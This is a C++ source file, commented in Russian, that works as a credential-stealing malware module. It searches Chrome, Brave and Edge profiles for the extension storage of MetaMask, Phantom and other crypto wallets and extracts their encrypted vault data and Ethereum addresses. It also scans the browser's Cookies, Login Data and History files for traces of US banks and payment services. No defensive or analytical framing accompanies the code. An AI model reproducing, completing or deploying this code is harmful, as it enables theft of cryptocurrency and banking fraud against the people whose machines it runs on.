#include "wallets.h"
#include "../utils.h"
#include <filesystem>
#include <fstream>
#include <regex>
#include <algorithm>

namespace fs = std::filesystem;

// --- 1. Описываем поддерживаемые кошельки ---
std::vector<WalletExtension> GetSupportedWallets() {
    return {
        {"MetaMask",      "nkbihfbeogaeaoehlefnkodbefgpgknn", {"vault", "mnemonic", "CryptoHDKeyring", "encrypted"}},
        {"TrustWallet",   "egjidjbpglichdcondbcbdnbeeppgdph", {"vault", "mnemonic", "encrypted", "wallet"}},
        {"BinanceWallet", "fhbohimaelbohpjbbldcngcnapndodjp", {"vault", "mnemonic", "encrypted", "privateKey"}},
        {"CoinbaseWallet","hnfanknocfeofbddgcijnmhnfnkdnaad", {"vault", "mnemonic", "seed", "encrypted"}},
        {"Phantom",       "bfnaelmomeimhlpmgjnjophhpkkoljpa", {"vault", "mnemonic", "seed", "encrypted"}},
        {"Keplr",         "dmkamcknogkgcdfhhbddcghachkejeap", {"vault", "mnemonic", "key", "encrypted"}}
        // Можно добавить ещё (см. README)
    };
}

// --- 2. Получение профилей браузеров ---
std::vector<std::pair<std::string, std::string>> GetBrowserProfiles() {
    std::vector<std::pair<std::string, std::string>> result;

    wchar_t* localAppData = nullptr;
    size_t sz = 0;
    _wdupenv_s(&localAppData, &sz, L"LOCALAPPDATA");
    if (!localAppData) return result;

    std::vector<std::wstring> profiles = {L"Default", L"Profile 1", L"Profile 2", L"Profile 3"};
    // Chrome
    std::wstring chromeBase = std::wstring(localAppData) + L"\\Google\\Chrome\\User Data";
    for (const auto& prof : profiles) {
        std::wstring path = chromeBase + L"\\" + prof;
        if (fs::exists(path)) {
            std::string pathUtf8 = Utils::WStringToString(path);
            if (!pathUtf8.empty()) {
                result.push_back({"chrome", pathUtf8});
            }
        }
    }
    // Brave
    std::wstring braveBase = std::wstring(localAppData) + L"\\BraveSoftware\\Brave-Browser\\User Data";
    for (const auto& prof : profiles) {
        std::wstring path = braveBase + L"\\" + prof;
        if (fs::exists(path)) {
            std::string pathUtf8 = Utils::WStringToString(path);
            if (!pathUtf8.empty()) {
                result.push_back({"brave", pathUtf8});
            }
        }
    }
    // Edge
    std::wstring edgeBase = std::wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
    for (const auto& prof : profiles) {
        std::wstring path = edgeBase + L"\\" + prof;
        if (fs::exists(path)) {
            std::string pathUtf8 = Utils::WStringToString(path);
            if (!pathUtf8.empty()) {
                result.push_back({"edge", pathUtf8});
            }
        }
    }

    free(localAppData);
    return result;
}

// --- 3. Вспомогательные функции ---
static std::vector<std::string> ExtractEthAddresses(const std::string& data) {
    std::vector<std::string> addresses;
    std::regex ethRe("0x[a-fA-F0-9]{40}");
    std::smatch m;
    std::string::const_iterator searchStart(data.cbegin());
    while (std::regex_search(searchStart, data.cend(), m, ethRe)) {
        addresses.push_back(m[0]);
        searchStart = m.suffix().first;
    }
    return addresses;
}

static std::string ExtractVaultJson(const std::string& data, const std::string& key) {
    size_t pos = data.find(key);
    if (pos == std::string::npos) return "";
    size_t start = data.find("{", pos);
    if (start == std::string::npos) return "";
    int brace = 1; size_t i = start + 1;
    while (brace && i < data.size()) {
        if (data[i] == '{') brace++;
        else if (data[i] == '}') brace--;
        i++;
    }
    return (brace == 0) ? data.substr(start, i - start) : "";
}

// --- 4. Основная функция поиска по всем кошелькам ---
std::vector<FoundWallet> ExtractAllWallets() {
    std::vector<FoundWallet> found;
    auto wallets = GetSupportedWallets();
    auto browserProfiles = GetBrowserProfiles();

    for (const auto& bp : browserProfiles) {
        const std::string& browser = bp.first;
        const std::string& profilePath = bp.second;

        for (const auto& wallet : wallets) {
            fs::path extDir = fs::path(profilePath) / "Local Extension Settings" / wallet.chromeId;
            if (!fs::exists(extDir)) continue;

            for (const auto& file : fs::directory_iterator(extDir)) {
                if (file.path().extension() != ".ldb" && file.path().extension() != ".log") continue;

                std::ifstream in(file.path(), std::ios::binary);
                if (!in) continue;
                std::string data((std::istreambuf_iterator<char>(in)), std::istreambuf_iterator<char>());
                for (const auto& key : wallet.searchKeys) {
                    size_t keyPos = data.find(key);
                    if (keyPos != std::string::npos) {
                        FoundWallet fw;
                        fw.walletType = wallet.name;
                        fw.browser = browser;
                        fw.profile = profilePath;
                        fw.vaultData = ExtractVaultJson(data, key);
                        fw.accounts = ExtractEthAddresses(data); // Можно добавить SOL/SBTC
                        found.push_back(fw);
                        break; // нашли ключ — идём к след. файлу
                    }
                }
            }
        }
    }
    return found;
}

std::string LowerString(const std::string& s) {
    std::string result = s;
    std::transform(result.begin(), result.end(), result.begin(), ::tolower);
    return result;
}

// --- 5. Поиск банковской информации ---
std::vector<std::string> ExtractBankingData(const std::string& profilePath) {
    std::vector<std::string> banks = {
        "chase", "wells fargo", "zelle", "stripe", "paypal", "bankofamerica", "capitalone",
        "citibank", "usbank", "tdbank", "pnc", "discover", "american express", "bmo", "regions", "suntrust"
        // ... добавляй нужные банки/платёжки
    };
    std::vector<std::string> result;

    // Куки
    std::string cookiesPath = profilePath + "\\Cookies";
    if (fs::exists(cookiesPath)) {
        std::ifstream f(cookiesPath, std::ios::binary);
        std::string filedata((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        std::string low = LowerString(filedata);
        for (const auto& bank : banks) {
            if (low.find(LowerString(bank)) != std::string::npos)
                result.push_back(bank + ": found in cookies");
        }
    }
    // Логины
    std::string loginDataPath = profilePath + "\\Login Data";
    if (fs::exists(loginDataPath)) {
        std::ifstream f(loginDataPath, std::ios::binary);
        std::string filedata((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        std::string low = LowerString(filedata);
        for (const auto& bank : banks) {
            if (low.find(LowerString(bank)) != std::string::npos)
                result.push_back(bank + ": found in logins");
        }
    }
    // История
    std::string historyPath = profilePath + "\\History";
    if (fs::exists(historyPath)) {
        std::ifstream f(historyPath, std::ios::binary);
        std::string filedata((std::istreambuf_iterator<char>(f)), std::istreambuf_iterator<char>());
        std::string low = LowerString(filedata);
        for (const auto& bank : banks) {
            if (low.find(LowerString(bank)) != std::string::npos)
                result.push_back(bank + ": found in history");
        }
    }
    return result;
}
